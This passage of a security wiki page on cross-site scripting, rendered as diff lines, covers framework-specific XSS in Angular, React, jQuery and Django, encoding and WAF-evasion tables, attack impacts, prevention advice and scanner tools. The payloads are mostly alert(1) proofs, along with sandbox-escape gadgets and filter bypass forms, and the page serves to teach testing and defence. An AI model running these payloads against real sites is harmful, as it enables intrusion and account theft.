+  <strong>Flow of Attack :</strong>
+  <a class="anchor" href="#flow-of-attack--1">#</a>
+</h3>
+<ol>
+<li>App reflects untrusted data inside <code>ng-app</code>, <code>ng-bind</code>, or templates.</li>
+<li>Angular parses the attacker’s expression.</li>
+<li>Expression escapes Angular’s sandbox via known gadget chains.</li>
+<li>Attacker gains access to the JS function constructor.</li>
+<li>Payload executes as JavaScript → <strong>XSS</strong>.</li>
+</ol>
+<h3 id="payload--1">
+  <strong>Payload :</strong>
+  <a class="anchor" href="#payload--1">#</a>
+</h3>
+<ul>
+<li>{{ constructor.constructor(&lsquo;alert(1)&rsquo;)() }}</li>
+<li>{{ (&rsquo;&rsquo;.sub.constructor(&lsquo;alert(1)&rsquo;))() }}</li>
+<li>{{ toString.constructor(&lsquo;alert(1)&rsquo;)() }}</li>
+</ul>
+<h3 id="3-react">
+  3. React
+  <a class="anchor" href="#3-react">#</a>
+</h3>
+<ul>
+<li>React is a UI library using a virtual DOM. It <strong>does not evaluate strings as HTML by default</strong>, but XSS occurs when unsafe APIs or dangerous props are used.</li>
+</ul>
+<h3 id="react--dangerous-html-rendering">
+  <strong>React – Dangerous HTML Rendering</strong>
+  <a class="anchor" href="#react--dangerous-html-rendering">#</a>
+</h3>
+<ul>
+<li>React protects against XSS unless developers use:
+<ul>
+<li><strong><code>dangerouslySetInnerHTML</code></strong></li>
+<li><strong>Uncontrolled DOM insertion</strong></li>
+<li><strong>User-controlled JSX attributes</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="flow-of-attack--2">
+  <strong>Flow of Attack :</strong>
+  <a class="anchor" href="#flow-of-attack--2">#</a>
+</h3>
+<ol>
+<li>Application inserts user-controlled HTML or props into JSX unsafely.</li>
+<li>React passes the string to the browser without sanitization.</li>
+<li>Browser interprets HTML tags or event handlers.</li>
+<li>Embedded JS inside attributes (<code>onerror</code>, <code>onclick</code>, etc.) executes → <strong>XSS</strong>.</li>
+</ol>
+<h3 id="payloads--1">
+  <strong>Payloads :</strong>
+  <a class="anchor" href="#payloads--1">#</a>
+</h3>
+<ul>
+<li>ReactDOM.render(<img src="x" onerror="alert(1)" />, mountNode)</li>
+<li>
+<div dangerouslySetInnerHTML={{ __html: '<img src=x onerror=alert(1)>' }} />
+</li>
+<li>ReactDOM.render(<img src=x onerror=alert(1) />, document.body);</li>
+</ul>
+<h3 id="4-jquery">
+  4. jQuery
+  <a class="anchor" href="#4-jquery">#</a>
+</h3>
+<ul>
+<li><strong>jQuery</strong> is a widely used JavaScript library for DOM manipulation.</li>
+<li>Older versions (&lt; <strong>3.5.0</strong>) contained vulnerabilities where <strong>unsafe HTML insertion</strong> and <strong>prototype pollution</strong> allowed attacker-controlled HTML/JS to be executed inside the DOM.</li>
+</ul>
+<h3 id="jquery--xss-via-improper-html-handlingcve-2020-7656">
+  <strong>jQuery – XSS via Improper HTML Handling(CVE-2020-7656)</strong>
+  <a class="anchor" href="#jquery--xss-via-improper-html-handlingcve-2020-7656">#</a>
+</h3>
+<ul>
+<li>jQuery incorrectly handled HTML when using functions like <code>.html()</code>, <code>.append()</code>, <code>.before()</code>, <code>.after()</code> etc., allowing attacker-controlled HTML to be parsed as executable script.</li>
+</ul>
+<h3 id="flow-of-attack--3">
+  <strong>Flow of Attack :</strong>
+  <a class="anchor" href="#flow-of-attack--3">#</a>
+</h3>
+<ol>
+<li>Application inserts untrusted HTML into <code>.html()</code> / <code>.append()</code>.</li>
+<li>jQuery parses the HTML and constructs DOM elements.</li>
+<li><code>&lt;script&gt;</code> tags and <code>onerror=</code> handlers inside the HTML are executed.</li>
+<li>Any user visiting the page runs the injected JS → XSS.</li>
+</ol>
+<h3 id="payload--2">
+  <strong>Payload :</strong>
+  <a class="anchor" href="#payload--2">#</a>
+</h3>
+<ul>
+<li>
+<body>.append("<img src='x' onerror='alert(1)'>")
+</li>
+</ul>
+<h3 id="xss-via-prototype-pollutioncve-2019-11358">
+  <strong>XSS via Prototype Pollution</strong>(CVE-2019-11358)
+  <a class="anchor" href="#xss-via-prototype-pollutioncve-2019-11358">#</a>
+</h3>
+<ul>
+<li><strong>CVE-2019-11358</strong> — jQuery’s <code>$.extend(true, …)</code> could be abused for <strong>prototype pollution</strong>, enabling attackers to plant polluted properties on <code>Object.prototype</code>. These values were later used inside DOM updates → <strong>XSS</strong>.</li>
+</ul>
+<h3 id="flow-of-attack--4">
+  <strong>Flow of Attack :</strong>
+  <a class="anchor" href="#flow-of-attack--4">#</a>
+</h3>
+<ol>
+<li>App accepts attacker-controlled JSON/params.</li>
+<li>Unsafe merge via <code>$.extend(true, target, source)</code> processes <code>&quot;__proto__&quot;</code> keys.</li>
+<li>Attacker pollutes <code>Object.prototype.propertyName</code>.</li>
+<li>Later jQuery calls (like <code>.html(config.safeLink)</code>) use polluted properties.</li>
+<li>Polluted value contains attacker-controlled HTML → XSS.</li>
+</ol>
+<h3 id="payloads--2">
+  <strong>Payloads :</strong>
+  <a class="anchor" href="#payloads--2">#</a>
+</h3>
+<ul>
+<li>$(&lsquo;div&rsquo;).html(&rsquo;<img src=x onerror=alert(1)>&rsquo;);</li>
+<li>
+<svg onload='alert(1)'>
+</li>
+</ul>
+<h3 id="5-django">
+  5. Django
+  <a class="anchor" href="#5-django">#</a>
+</h3>
+<ul>
+<li>Django is a Python web framework using Jinja-like templating.</li>
+<li>Django auto-escapes output, but developers can disable escaping using filters like <code>|safe</code>.</li>
+</ul>
+<h3 id="django--unsafe-template-rendering">
+  <strong>Django – Unsafe Template Rendering</strong>
+  <a class="anchor" href="#django--unsafe-template-rendering">#</a>
+</h3>
+<ul>
+<li>XSS happens when developers use <strong><code>safe</code></strong>, <strong><code>mark_safe</code></strong>, or disable autoescaping.</li>
+<li>This directly injects user HTML into the page.</li>
+</ul>
+<h3 id="flow-of-attack--5">
+  <strong>Flow of Attack :</strong>
+  <a class="anchor" href="#flow-of-attack--5">#</a>
+</h3>
+<ol>
+<li>User-controlled value is passed into a template.</li>
+<li>Developer marks it as <strong>safe</strong>, disabling Django’s escaping.</li>
+<li>Browser receives raw HTML.</li>
+<li>Browser executes tags or JS inside attributes → <strong>XSS</strong>.</li>
+</ol>
+<h3 id="payloads--3">
+  <strong>Payloads :</strong>
+  <a class="anchor" href="#payloads--3">#</a>
+</h3>
+<ul>
+<li>{{ value|safe }}</li>
+<li>{{ user_input|safe }}</li>
+<li>{{ mark_safe(user_input) }}</li>
+</ul>
+<hr>
+<h2 id="encoding-and-obfuscation">
+  Encoding and Obfuscation
+  <a class="anchor" href="#encoding-and-obfuscation">#</a>
+</h2>
+<h3 id="encoding">
+  <strong>Encoding</strong>
+  <a class="anchor" href="#encoding">#</a>
+</h3>
+<p>“Attackers encode payload characters (hex, URL, Unicode, Base64) so the malicious script is hidden during input filtering, hoping the browser will decode it later and execute it.”</p>
+<h3 id="obfuscation">
+  <strong>Obfuscation</strong>
+  <a class="anchor" href="#obfuscation">#</a>
+</h3>
+<p>“Attackers rearrange, split, or mask parts of the script (comments, whitespace, case changes, string concatenation) to trick WAFs and filters that look for direct keywords like <code>&lt;script&gt;</code> or <code>alert</code>.”</p>
+<table>
+<thead>
+<tr>
+<th><strong>Technique</strong></th>
+<th><strong>Obfuscated</strong></th>
+<th><strong>Original Payload</strong></th>
+<th><strong>Purpose</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Hex Encoding</strong></td>
+<td><code>\\x61\\x6c\\x65\\x72\\x74(1)</code></td>
+<td><code>alert(1)</code> → <code>alert(1)</code> as text</td>
+<td>Hide chars in hex</td>
+</tr>
+<tr>
+<td><strong>Unicode Encoding</strong></td>
+<td><code>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</code></td>
+<td><code>alert(1)</code></td>
+<td>Bypass Unicode filters</td>
+</tr>
+<tr>
+<td><strong>Octal Encoding</strong></td>
+<td><code>\\141\\154\\145\\162\\164(1)</code></td>
+<td><code>alert(1)</code></td>
+<td>Alternate numeric encoding</td>
+</tr>
+<tr>
+<td><strong>HTML Entities</strong></td>
+<td><code>&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)</code></td>
+<td><code>alert(1)</code></td>
+<td>Evade HTML parsing</td>
+</tr>
+<tr>
+<td><strong>Base64 Encoding</strong></td>
+<td><code>YWxlcnQoMSk=</code> <em>(decoded with atob)</em></td>
+<td><code>alert(1)</code></td>
+<td>Hide full payload</td>
+</tr>
+<tr>
+<td><strong>String Concatenation</strong></td>
+<td><code>'ale'+'rt'(1)</code></td>
+<td><code>alert(1)</code></td>
+<td>Break keyword match</td>
+</tr>
+<tr>
+<td><strong>Template Literals</strong></td>
+<td><code>alert\</code>1``</td>
+<td><code>alert(1)</code></td>
+<td>Use JS backticks</td>
+</tr>
+<tr>
+<td><strong>Character Codes</strong></td>
+<td><code>String.fromCharCode(97,108,...)</code></td>
+<td><code>alert(1)</code></td>
+<td>Dynamic code building</td>
+</tr>
+<tr>
+<td><strong>Whitespace / Newline</strong></td>
+<td><code>java\nscript:alert(1)</code> <em>(escaped)</em></td>
+<td><code>javascript:alert(1)</code></td>
+<td>Break scheme detection</td>
+</tr>
+<tr>
+<td><strong>URL Encoding</strong></td>
+<td><code>%61%6c%65%72%74(1)</code></td>
+<td><code>alert(1)</code></td>
+<td>Escape characters in URLs</td>
+</tr>
+<tr>
+<td><strong>Comment Injection</strong></td>
+<td><code>a/**/lert(1)</code></td>
+<td><code>alert(1)</code></td>
+<td>Split malicious keywords</td>
+</tr>
+<tr>
+<td><strong>Alternative Execution</strong></td>
+<td><code>setTimeout('alert(1)')</code> <em>(escaped)</em></td>
+<td><code>alert(1)</code></td>
+<td>Indirect JS execution</td>
+</tr>
+<tr>
+<td><strong>Mixed Techniques</strong></td>
+<td>Base64 + hex + split forms</td>
+<td><code>alert(1)</code></td>
+<td>Evade multi-layer filters</td>
+</tr>
+</tbody>
+</table>
+<h2 id="waf-bypasses-techniques">
+  <strong>WAF Bypasses Techniques</strong>
+  <a class="anchor" href="#waf-bypasses-techniques">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Technique</strong></th>
+<th><strong>Example</strong></th>
+<th><strong>Purpose</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Case Toggling</strong></td>
+<td><code>&lt;ScrIpT&gt;confirm()&lt;/sCRiPt&gt;</code></td>
+<td>Change case to bypass filters</td>
+</tr>
+<tr>
+<td><strong>Using Comments</strong></td>
+<td><code>&lt;!--&gt;&lt;script&gt;confirm/**/0/**/&lt;/script&gt;</code></td>
+<td>Disrupt parser logic</td>
+</tr>
+<tr>
+<td><strong>Null Character Injection</strong></td>
+<td><code>%00</code></td>
+<td>Break WAF parsing</td>
+</tr>
+<tr>
+<td><strong>Inline Comments</strong></td>
+<td><code>/*!SELECT*/</code></td>
+<td>Break keyword detection</td>
+</tr>
+<tr>
+<td><strong>HTTP Parameter Pollution</strong></td>
+<td><code>?id=1&amp;id=2</code></td>
+<td>Confuse parameter parsers</td>
+</tr>
+<tr>
+<td><strong>Keyword Splitting</strong></td>
+<td><code>SEL&lt;ECT&gt;</code></td>
+<td>Split malicious keyword</td>
+</tr>
+<tr>
+<td><strong>Character Reference Encoding</strong></td>
+<td><code>&lt;a href=j&amp;#97;v&amp;#97;script&amp;#x3A;&amp;#97;lert(1)&gt;</code></td>
+<td>Use ASCII/hex refs</td>
+</tr>
+<tr>
+<td><strong>Junk Characters</strong></td>
+<td><code>&lt;script&gt;+-+1-++alert(1)&lt;/script&gt;</code></td>
+<td>Add noise to mask intent</td>
+</tr>
+<tr>
+<td><strong>WAF Auto-learning Abuse</strong></td>
+<td><code>N/A</code></td>
+<td>Exploit adaptive behavior</td>
+</tr>
+</tbody>
+</table>
+<h3 id="flow-after-encoding--obfuscation-">
+  <strong>FLOW After encoding , obfuscation :</strong>
+  <a class="anchor" href="#flow-after-encoding--obfuscation-">#</a>
+</h3>
+<p>Attacker Payload → Encoded/Obfuscated → Frontend Validation → (Mostly bypassed) →WAF Filtering → (Can be bypassed) → Backend Canonicalization → Decoding → Validation → Output Encoding → Browser Rendering</p>
+<ul>
+<li>If canonicalization + output encoding are <strong>correct</strong> → <strong>XSS blocked</strong></li>
+<li>If output encoding is <strong>missing</strong> → <strong>XSS executes</strong></li>
+</ul>
+<hr>
+<h2 id="impacts-of-xss">
+  Impacts of XSS
+  <a class="anchor" href="#impacts-of-xss">#</a>
+</h2>
+<h3 id="1-session-hijacking">
+  <strong>1. Session Hijacking</strong>
+  <a class="anchor" href="#1-session-hijacking">#</a>
+</h3>
+<p>Attacker injects JS ➝ steals <code>document.cookie</code> (session ID) ➝ sends to attacker server ➝ attacker replays session token ➝ full account takeover.</p>
+<h3 id="2-credential-theft">
+  <strong>2. Credential Theft</strong>
+  <a class="anchor" href="#2-credential-theft">#</a>
+</h3>
+<p>Malicious XSS form ➝ user enters username/password ➝ JS intercepts form fields ➝ exfiltrates to attacker ➝ attacker logs in as victim.</p>
+<h3 id="3-keylogging">
+  <strong>3. Keylogging</strong>
+  <a class="anchor" href="#3-keylogging">#</a>
+</h3>
+<p>Injected JS hooks <code>onkeypress</code> ➝ captures keystrokes ➝ sends keystrokes to attacker ➝ attacker reconstructs passwords/inputs.</p>
+<h3 id="4-phishing-through-dom-injection">
+  <strong>4. Phishing Through DOM Injection</strong>
+  <a class="anchor" href="#4-phishing-through-dom-injection">#</a>
+</h3>
+<p>XSS injects fake login popup/UI ➝ user believes it’s legitimate ➝ enters credentials ➝ attacker captures them ➝ impersonation.</p>
+<h3 id="5-malware-distribution">
+  <strong>5. Malware Distribution</strong>
+  <a class="anchor" href="#5-malware-distribution">#</a>
+</h3>
+<p>XSS injects <code>&lt;script src=&quot;malware.js&quot;&gt;</code> ➝ browser loads malicious script ➝ installs trojan/stealer ➝ attacker gains persistence.</p>
+<h3 id="6-account-takeover--privilege-abuse">
+  <strong>6. Account Takeover / Privilege Abuse</strong>
+  <a class="anchor" href="#6-account-takeover--privilege-abuse">#</a>
+</h3>
+<p>XSS runs privileged actions via victim session ➝ performs admin actions (add users, change roles) ➝ escalates privileges invisibly.</p>
+<h3 id="7-csrf-automation-via-xss">
+  <strong>7. CSRF Automation via XSS</strong>
+  <a class="anchor" href="#7-csrf-automation-via-xss">#</a>
+</h3>
+<p>XSS bypasses CSRF tokens ➝ attacker uses victim session + JS to send authenticated requests ➝ performs destructive actions.</p>
+<h3 id="8-internal-network-scanning">
+  <strong>8. Internal Network Scanning</strong>
+  <a class="anchor" href="#8-internal-network-scanning">#</a>
+</h3>
+<p>XSS executes JS in victim browser ➝ sends requests to internal IPs (<code>192.168.*.*</code>) ➝ maps internal services ➝ attacker pivots internally.</p>
+<h3 id="9-stored-worm--self-propagating-xss">
+  <strong>9. Stored Worm / Self-Propagating XSS</strong>
+  <a class="anchor" href="#9-stored-worm--self-propagating-xss">#</a>
+</h3>
+<p>XSS writes payload into DB ➝ every viewer gets infected ➝ their browsers inject the same payload ➝ worm spreads across users rapidly.</p>
+<h3 id="10-browser-exploitation">
+  <strong>10. Browser Exploitation</strong>
+  <a class="anchor" href="#10-browser-exploitation">#</a>
+</h3>
+<p>XSS loads malicious iframes ➝ exploits browser/plugin vulnerabilities ➝ code execution ➝ full host compromise (rare but real).</p>
+<h3 id="11-data-exfiltration">
+  <strong>11. Data Exfiltration</strong>
+  <a class="anchor" href="#11-data-exfiltration">#</a>
+</h3>
+<p>XSS reads form fields, CSRF tokens, page data ➝ exfiltrates via <code>fetch()</code>/<code>img</code> beacon ➝ attacker obtains sensitive information.</p>
+<h3 id="12-ui-redressing--clickjacking-assistance">
+  <strong>12. UI Redressing / Clickjacking Assistance</strong>
+  <a class="anchor" href="#12-ui-redressing--clickjacking-assistance">#</a>
+</h3>
+<p>XSS manipulates DOM ➝ hides buttons, injects invisible overlays ➝ forces user clicks ➝ triggers unauthorized actions.</p>
+<h3 id="13-stored-defacement">
+  <strong>13. Stored Defacement</strong>
+  <a class="anchor" href="#13-stored-defacement">#</a>
+</h3>
+<p>Attacker injects HTML/CSS/JS ➝ alters site appearance ➝ reputational damage ➝ loss of user trust.</p>
+<h3 id="14-supply-chain-attack-via-xss">
+  <strong>14. Supply-Chain Attack via XSS</strong>
+  <a class="anchor" href="#14-supply-chain-attack-via-xss">#</a>
+</h3>
+<p>Malicious script injects compromised CDN/library URLs ➝ every visitor loads attacker-controlled JS ➝ mass compromise.</p>
+<h3 id="15-email--notification-hijacking">
+  <strong>15. Email / Notification Hijacking</strong>
+  <a class="anchor" href="#15-email--notification-hijacking">#</a>
+</h3>
+<p>XSS changes notification templates ➝ injects phishing links ➝ attacker spreads malware automatically through system notifications.</p>
+<ul>
+<li>Session Hijacking</li>
+<li>Credential Theft</li>
+<li>Keylogging</li>
+<li>Phishing</li>
+<li>Malware Distribution</li>
+<li>Site Defacement</li>
+</ul>
+<hr>
+<h2 id="prevention-techniques">
+  Prevention Techniques
+  <a class="anchor" href="#prevention-techniques">#</a>
+</h2>
+<h3 id="input-validation">
+  Input Validation
+  <a class="anchor" href="#input-validation">#</a>
+</h3>
+<ul>
+<li>Strict allowlist for all user inputs</li>
+</ul>
+<h3 id="output-encoding">
+  Output Encoding
+  <a class="anchor" href="#output-encoding">#</a>
+</h3>
+<ul>
+<li>Use HTML, JavaScript, URL, and CSS context encoding</li>
+</ul>
+<h3 id="content-security-policy-csp">
+  Content Security Policy (CSP)
+  <a class="anchor" href="#content-security-policy-csp">#</a>
+</h3>
+<pre tabindex="0"><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &lt;https://trusted.cdn.com&gt;
+</code></pre><h3 id="secure-cookies">
+  Secure Cookies
+  <a class="anchor" href="#secure-cookies">#</a>
+</h3>
+<ul>
+<li>Set <code>HttpOnly</code> and <code>Secure</code> flags</li>
+</ul>
+<h3 id="safe-dom-handling">
+  Safe DOM Handling
+  <a class="anchor" href="#safe-dom-handling">#</a>
+</h3>
+<ul>
+<li>Prefer <code>textContent</code> over <code>innerHTML</code></li>
+</ul>
+<hr>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noreferrer noopener nofollow">XSSStrike</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> → Advanced XSS scanner that analyzes response context to craft <strong>smart, custom payloads</strong> rather than blindly injecting thousands of generic ones.
+python3 xssstrike.py -u target_url</li>
+<li><a href="https://github.com/hahwul/dalfox" target="_blank" rel="noreferrer noopener nofollow">Dalfox</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> → Fast Go-based scanner built for <strong>automation and CI/CD pipelines</strong> that excels at quickly processing lists of URLs from other tools.
+<strong>dalfox url target_url</strong></li>
+<li><a href="https://github.com/hahwul/XSpear" target="_blank" rel="noreferrer noopener nofollow">XSpear</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> → Ruby-based scanner that combines XSS detection with <strong>static analysis</strong> of security headers, server info, and SQL error patterns.
+<strong>Installation:</strong></li>
+<li><a href="https://github.com/ssl/ezXSS" target="_blank" rel="noreferrer noopener nofollow">ezXSS</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> → Modern self-hosted blind XSS platform with a dashboard that automatically captures page details, cookies, and screenshots with instant alerts via Slack/Discord.</li>
+<li><a href="https://github.com/LewisArdern/bXSS" target="_blank" rel="noreferrer noopener nofollow">bXSS</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> → Tool focused on detecting <strong>blind XSS vulnerabilities</strong> by injecting callback payloads that notify you when executed (repository currently inaccessible)</li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<p><a href="https://medium.com/@yadav-ajay/cross-site-scripting-xss-eb66824493ae" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@yadav-ajay/cross-site-scripting-xss-eb66824493ae</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noreferrer noopener nofollow">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html" target="_blank" rel="noreferrer noopener nofollow">https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://medium.com/@zerodayfreak/exploiting-web-applications-with-cross-site-scripting-xss-a-practical-guide-941137258b80" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@zerodayfreak/exploiting-web-applications-with-cross-site-scripting-xss-a-practical-guide-941137258b80</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39159" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39159</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://owasp.org/www-community/attacks/xss/" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-community/attacks/xss/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://medium.com/@Steiner254/reflected-cross-site-scripting-xss-7aae0f4343c3" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@Steiner254/reflected-cross-site-scripting-xss-7aae0f4343c3</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/cross-site-scripting</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/" target="_blank" rel="noreferrer noopener nofollow">https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://www.volkis.com.au/blog/bypass-xss-in-wafs/" target="_blank" rel="noreferrer noopener nofollow">https://www.volkis.com.au/blog/bypass-xss-in-wafs/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noreferrer noopener nofollow">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://rootast.medium.com/cross-site-scripting-xss-techniques-bypasses-and-detection-927af5a55d02" target="_blank" rel="noreferrer noopener nofollow">https://rootast.medium.com/cross-site-scripting-xss-techniques-bypasses-and-detection-927af5a55d02</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide" target="_blank" rel="noreferrer noopener nofollow">https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://payatu.com/blog/dom-based-xss/" target="_blank" rel="noreferrer noopener nofollow">https://payatu.com/blog/dom-based-xss/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Cross-Site%20Scripting%20%28XSS%29.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a>
+      <ul>
+        <li><a href="#types-of-xss-attacks">Types of XSS Attacks</a>
+          <ul>
+            <li><a href="#1-reflected-xss">1. Reflected XSS</a></li>
+            <li><a href="#2-stored-xss">2. Stored XSS</a></li>
+            <li><a href="#3-dom-based-xss">3. DOM-Based XSS</a></li>
+            <li><a href="#sources">Sources:</a></li>
+            <li><a href="#sinks">Sinks:</a></li>
+            <li><a href="#examples">Examples:</a></li>
+          </ul>
+        </li>
+        <li><a href="#common-xss-vectors">Common XSS Vectors:</a>
+          <ul>
+            <li><a href="#user-input-injection-points">User Input Injection Points</a></li>
+          </ul>
+        </li>
+        <li><a href="#testing-for-xss-"><strong>Testing for XSS :</strong></a>
+          <ul>
+            <li><a href="#1-manual-fuzzing"><strong>1. Manual Fuzzing</strong></a></li>
+            <li><a href="#2-automated-scanners"><strong>2. Automated Scanners</strong></a></li>
+            <li><a href="#3-code-review"><strong>3. Code Review</strong></a></li>
+            <li><a href="#4-realistic-attack-simulations"><strong>4. Realistic Attack Simulations</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#basic-xss-contexts--breakouts">Basic XSS Contexts &amp; Breakouts</a>
+          <ul>
+            <li><a href="#html-context">HTML Context:</a></li>
+            <li><a href="#attribute-context">Attribute Context</a></li>
+            <li><a href="#javascript-context">JavaScript Context</a></li>
+            <li><a href="#url-context">URL Context</a></li>
+            <li><a href="#event-handlers">Event Handlers</a></li>
+          </ul>
+        </li>
+        <li><a href="#blind-xss"><strong>Blind XSS</strong></a>
+          <ul>
+            <li><a href="#key-characteristics"><strong>Key Characteristics</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#detecting-blind-xss"><strong>Detecting Blind XSS</strong></a></li>
+        <li><a href="#exploiting-blind-xss"><strong>Exploiting Blind XSS</strong></a></li>
+        <li><a href="#blind-xss-payloads"><strong>Blind XSS Payloads</strong></a>
+          <ul>
+            <li><a href="#1-image-only-html-injection-check"><strong>1. Image-only (HTML Injection Check)</strong></a></li>
+            <li><a href="#2-image-tag-blind-xss"><strong>2. Image-tag Blind XSS</strong></a></li>
+            <li><a href="#3-dns-based-blind-xss"><strong>3. DNS-based Blind XSS</strong></a></li>
+            <li><a href="#4-iframe-based-blind-xss"><strong>4. iframe-based Blind XSS</strong></a></li>
+            <li><a href="#5-object-tag-blind-xss"><strong>5. Object-tag Blind XSS</strong></a></li>
+            <li><a href="#6-input-field-blind-xss"><strong>6. Input-field Blind XSS</strong></a></li>
+            <li><a href="#7-script-tag-callbacks"><strong>7. Script-tag Callbacks</strong></a></li>
+            <li><a href="#8-javascript-uri-scheme"><strong>8. JavaScript URI Scheme</strong></a></li>
+            <li><a href="#9-advanced-svg-blind-xss"><strong>9. Advanced SVG Blind XSS</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#modern-attack-surfaces">Modern Attack Surfaces</a>
+          <ul>
+            <li><a href="#1-single-page-applications-spas"><strong>1. Single Page Applications (SPAs)</strong></a></li>
+            <li><a href="#2-websockets"><strong>2. WebSockets</strong></a></li>
+            <li><a href="#3-server-side-rendering-ssr"><strong>3. Server-Side Rendering (SSR)</strong></a></li>
+            <li><a href="#4-graphql"><strong>4. GraphQL</strong></a></li>
+            <li><a href="#5-web-components"><strong>5. Web Components</strong></a></li>
+            <li><a href="#6-pdf-generators"><strong>6. PDF Generators</strong></a></li>
+            <li><a href="#7-postmessage-attacks"><strong>7. <code>postMessage</code> Attacks</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#bypassing-modern-defenses">Bypassing Modern Defenses</a>
+          <ul>
+            <li><a href="#filter-evasion"><strong>Filter Evasion</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#csp-bypass-techniques"><strong>CSP Bypass Techniques</strong></a>
+          <ul>
+            <li><a href="#1-inline-javascript-allowed-unsafe-inline"><strong>1. Inline JavaScript Allowed (<code>unsafe-inline</code>)</strong></a></li>
+            <li><a href="#2-dangerous-unsafe-eval-enabled"><strong>2. Dangerous <code>unsafe-eval</code> Enabled</strong></a></li>
